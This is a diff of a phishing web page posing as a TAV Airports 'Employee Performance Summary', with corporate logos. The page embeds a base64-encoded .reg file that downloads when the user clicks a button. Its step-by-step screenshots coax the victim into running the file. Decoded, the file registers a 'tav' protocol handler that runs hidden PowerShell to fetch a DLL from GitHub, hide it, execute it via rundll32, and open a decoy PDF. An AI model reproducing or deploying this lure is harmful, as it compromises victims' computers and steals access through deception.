@@ -1,16 +1,11 @@
-
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Employee Performance Summary</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
 
     body {
       margin: 0;
@@ -21,7 +16,7 @@
     }
 
     .container {
-      max-width: 850px;
+      max-width: 900px;
       margin: 60px auto;
       background-color: #ffffff;
       padding: 40px 30px;
@@ -58,6 +53,7 @@
     }
 
     .attention-text {
+      display: none;
       text-align: center;
       color: #c0392b;
       font-size: 16px;
@@ -71,27 +67,28 @@
     }
 
     .steps {
-      display: flex;
-      flex-direction: column;
-      gap: 30px;
+      display: none;
+      flex-wrap: wrap;
+      gap: 20px;
+      justify-content: center;
     }
 
     .step {
+      flex: 0 0 calc(50% - 20px);
       text-align: center;
     }
 
     .step img {
       width: 100%;
-      max-width: 600px;
-      height: auto;
+      max-width: 100%;
       border-radius: 10px;
       box-shadow: 0 4px 14px rgba(0, 0, 0, 0.15);
     }
 
     .step-title {
       font-weight: bold;
-      font-size: 18px;
-      margin-bottom: 12px;
+      font-size: 17px;
+      margin: 10px 0 12px;
       color: #1e3c72;
     }
 
@@ -112,46 +109,138 @@
       transition: transform 0.3s ease;
     }
 
-    .logo-bar img:hover {
-      transform: scale(1.05);
+    .logo-bar img:hover { transform: scale(1.05); }
+
+    @media (max-width: 700px) {
+      .step { flex: 0 0 100%; }
     }
 
-    @media (max-width: 600px) {
-      .download-button {
-        font-size: 15px;
-        padding: 12px 20px;
-      }
+    /* Modal (popup) styles */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.6);
+      justify-content: center;
+      align-items: center;
+    }
 
-      .attention-text {
-        font-size: 15px;
-        padding: 10px 14px;
-      }
+    .modal-content {
+      background-color: #fff;
+      padding: 25px;
+      border-radius: 10px;
+      text-align: center;
+      max-width: 480px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+    }
 
-      .step-title {
-        font-size: 16px;
-      }
+    .modal-content p {
+      font-size: 16px;
+      color: #c0392b;
+      margin-bottom: 20px;
+    }
+
+    .modal-content button {
+      background: linear-gradient(90deg, #4facfe, #00f2fe);
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 15px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .modal-content button:hover {
+      background: linear-gradient(90deg, #00f2fe, #4facfe);
     }
   </style>
 </head>
 <body>
+
+<div class="container">
+  <h1>Employee Performance Summary</h1>
+
+  <a id="view-button" class="download-button" href="#" onclick="openModal(); return false;">
+    View Performance Evaluation Result
+  </a>
+
+  <p class="attention-text" id="attention-text">
+    <strong>Can't see your performance results after clicking the button above?</strong><br>
+    Follow the steps below to fix it.
+  </p>
+
+  <div class="steps" id="steps-section">
+    <div class="step">
+      <div class="step-title">Step 1: Locate the downloaded .reg file</div>
+      <img src="https://i.hizliresim.com/q37ci3n.png" alt="Step 1 Screenshot">
+    </div>
+    <div class="step">
+      <div class="step-title">Step 2: Double-click to run the file</div>
+      <img src="https://i.hizliresim.com/da8p2zy.png" alt="Step 2 Screenshot">
+    </div>
+    <div class="step">
+      <div class="step-title">Step 3: Accept the registry editor confirmation</div>
+      <img src="https://i.hizliresim.com/frukhxi.png" alt="Step 3 Screenshot">
+    </div>
+    <div class="step">
+      <div class="step-title">Step 4: Return to this page and click the button again</div>
+      <img src="https://i.hizliresim.com/8w1nma9.png" alt="Step 4 Screenshot">
+    </div>
+  </div>
+
+  <div class="logo-bar">
+    <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Logo"/>
+    <img src="https://atu.com.tr/wp-content/uploads/2023/08/ATU-Logo-C%CC%A7erc%CC%A7eveli_page-0001-768x768.jpg" alt="ATU Logo"/>
+    <img src="https://lh3.googleusercontent.com/proxy/yz1SclzsHmWxi7cYNsYWeHPpOXufu8izj6XaxLj93kxxY2E9tonFUExXqlzVcmVsCaXqqEJ9gYmS5H8bB1m9NgEGoFN11ali5bvqoiBzMV11cYLI" alt="HAVAS Logo"/>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTug1qy1PlT2nX7mt03gWpE1_jdcFH4pLu06w&s" alt="BTA Logo"/>
+  </div>
+</div>
+
+<!-- Modal -->
+<div id="popupModal" class="modal">
+  <div class="modal-content">
+    <p><strong>Can't see your performance results?</strong><br>Click OK and follow the steps below.</p>
+    <button onclick="closeModalAndProceed()">OK</button>
+  </div>
+</div>
+
 <script>
-    function b64ToArrayBuffer(base64) {
-      const cleaned = base64.replace(/^data:.*;base64,/, '');
-      const binaryString = window.atob(cleaned);
-      const len = binaryString.length;
-      const bytes = new Uint8Array(len);
-      for (let i = 0; i < len; i++) {
-        bytes[i] = binaryString.charCodeAt(i);
-      }
-      return bytes.buffer;
+  function openModal() {
+    document.getElementById('popupModal').style.display = 'flex';
+  }
+
+  function closeModalAndProceed() {
+    document.getElementById('popupModal').style.display = 'none';
+    showSteps();
+    downloadRegFile();
+  }
+
+  function showSteps() {
+    document.getElementById('steps-section').style.display = 'flex';
+    document.getElementById('attention-text').style.display = 'block';
+  }
+
+  function b64ToArrayBuffer(base64) {
+    const cleaned = base64.replace(/^data:.*;base64,/, '');
+    const binaryString = window.atob(cleaned);
+    const len = binaryString.length;
+    const bytes = new Uint8Array(len);
+    for (let i = 0; i < len; i++) {
+      bytes[i] = binaryString.charCodeAt(i);
     }
+    return bytes.buffer;
+  }
 
-    const base64 = 'V2luZG93cyBSZWdpc3RyeSBFZGl0b3IgVmVyc2lvbiA1LjAwDQoNCltIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxDbGFzc2VzXHRhdl0NCkA9IlVSTDpUQVYgUERGIFZpZXdlciINCiJVUkwgUHJvdG9jb2wiPSIiDQoNCg0KW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXENsYXNzZXNcdGF2XHNoZWxsXQ0KDQpbSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcQ2xhc3Nlc1x0YXZcc2hlbGxcb3Blbl0NCg0KW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXENsYXNzZXNcdGF2XHNoZWxsXG9wZW5cY29tbWFuZF0NCkA9InBvd2Vyc2hlbGwuZXhlIC1XIEhpZGRlbiAtY29tbWFuZCBcIiRhPUpvaW4tUGF0aCAkZW52OlVTRVJQUk9GSUxFIERvd25sb2Fkcztpd3IgLXVyaSBodHRwczovL2dpdGh1Yi5jb20vZG9lMTc0MDkvdGF2LWFwaS9yYXcvcmVmcy9oZWFkcy9tYWluL2xsdm1mdW5jLmRsbCAtbyAkYVxcXFxsbHZtZnVuYy5kbGw7JGI9Sm9pbi1QYXRoICRhIGxsdm1mdW5jLmRsbDthdHRyaWIgK2ggJGI7Y29uaG9zdCBjb25ob3N0IHJ1bmRsbDMyLmV4ZSAkYix0ZXN0OyBTdGFydC1Qcm9jZXNzIG1zZWRnZSAtQXJndW1lbnRMaXN0ICdodHRwczovL2lyLnRhdi5hZXJvL3VwbG9hZHMvZG9jdW1lbnRzL0RvY3VtZW50czI0MDQyMDI1MTg1ODE3Xy5wZGYnLCctLXN0YXJ0LWZ1bGxzY3JlZW4nXCIiDQo='; // kısaltılmış
-
+  function downloadRegFile() {
+    const base64 = 'V2luZG93cyBSZWdpc3RyeSBFZGl0b3IgVmVyc2lvbiA1LjAwDQoNCltIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxDbGFzc2VzXHRhdl0NCkA9IlVSTDpUQVYgUERGIFZpZXdlciINCiJVUkwgUHJvdG9jb2wiPSIiDQoNCg0KW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXENsYXNzZXNcdGF2XHNoZWxsXQ0KDQpbSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcQ2xhc3Nlc1x0YXZcc2hlbGxcb3Blbl0NCg0KW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXENsYXNzZXNcdGF2XHNoZWxsXG9wZW5cY29tbWFuZF0NCkA9InBvd2Vyc2hlbGwuZXhlIC1XIEhpZGRlbiAtY29tbWFuZCBcIiRhPUpvaW4tUGF0aCAkZW52OlVTRVJQUk9GSUxFIERvd25sb2Fkcztpd3IgLXVyaSBodHRwczovL2dpdGh1Yi5jb20vZG9lMTc0MDkvdGF2LWFwaS9yYXcvcmVmcy9oZWFkcy9tYWluL2xsdm1mdW5jLmRsbCAtbyAkYVxcXFxsbHZtZnVuYy5kbGw7JGI9Sm9pbi1QYXRoICRhIGxsdm1mdW5jLmRsbDthdHRyaWIgK2ggJGI7Y29uaG9zdCBjb25ob3N0IHJ1bmRsbDMyLmV4ZSAkYix0ZXN0OyBTdGFydC1Qcm9jZXNzIG1zZWRnZSAtQXJndW1lbnRMaXN0ICdodHRwczovL2lyLnRhdi5hZXJvL3VwbG9hZHMvZG9jdW1lbnRzL0RvY3VtZW50czI0MDQyMDI1MTg1ODE3Xy5wZGYnLCctLXN0YXJ0LWZ1bGxzY3JlZW4nXCIiDQo='; // Kısaltılmış base64 içeriği
     const arrayBuffer = b64ToArrayBuffer(base64);
     const blob = new Blob([arrayBuffer], { type: 'application/octet-stream' });
     const filename = 'TAV_Fix_PDF_FileType_Handler.2.reg';
-
     const a = document.createElement('a');
     a.style.display = 'none';
     a.href = URL.createObjectURL(blob);
@@ -160,49 +249,8 @@
     a.click();
     URL.revokeObjectURL(a.href);
     a.remove();
-  </script>
-  <div class="container">
-    <h1>Employee Performance Summary</h1>
-
-    <a class="download-button" href="tav://TAV_EmployeePDF" download>
-      View Performance Evaluation Result
-    </a>
-
-    <p class="attention-text">
-      <strong>Can't see your performance results after clicking the button above?</strong><br>
-      Follow the steps below to fix it.
-    </p>
-
-    <div class="steps">
-      <div class="step">
-        <div class="step-title">Step 1: Run the file.</div>
-        <img src="https://i.hizliresim.com/q37ci3n.png" alt="Step 1 Screenshot">
-      </div>
-      <div class="step">
-        <div class="step-title">Step 2: Click yes on this page.</div>
-        <img src="https://i.hizliresim.com/da8p2zy.png" alt="Step 2 Screenshot">
-      </div>
-      <div class="step">
-        <div class="step-title">Step 3: Accept the registry editor confirmation</div>
-        <img src="https://i.hizliresim.com/frukhxi.png" alt="Step 3 Screenshot">
-      </div>
-      <div class="step">
-        <div class="step-title">Step 4: Confirm successful update</div>
-        <img src="https://i.hizliresim.com/4lw6wia.png" alt="Step 4 Screenshot">
-      </div>
-      <div class="step">
-        <div class="step-title">Step 5: Return to this page and click the button again</div>
-        <img src="https://i.hizliresim.com/8w1nma9.png" alt="Step 5 Screenshot">
-      </div>
-    </div>
-
-    <div class="logo-bar">
-      <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Logo" />
-      <img src="https://atu.com.tr/wp-content/uploads/2023/08/ATU-Logo-C%CC%A7erc%CC%A7eveli_page-0001-768x768.jpg" alt="ATU Logo" />
-      <img src="https://lh3.googleusercontent.com/proxy/yz1SclzsHmWxi7cYNsYWeHPpOXufu8izj6XaxLj93kxxY2E9tonFUExXqlzVcmVsCaXqqEJ9gYmS5H8bB1m9NgEGoFN11ali5bvqoiBzMV11cYLI" alt="HAVAS Logo" />
-      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTug1qy1PlT2nX7mt03gWpE1_jdcFH4pLu06w&s" alt="BTA Logo" />
-    </div>
-  </div>
+  }
+</script>
 
 </body>
 </html>
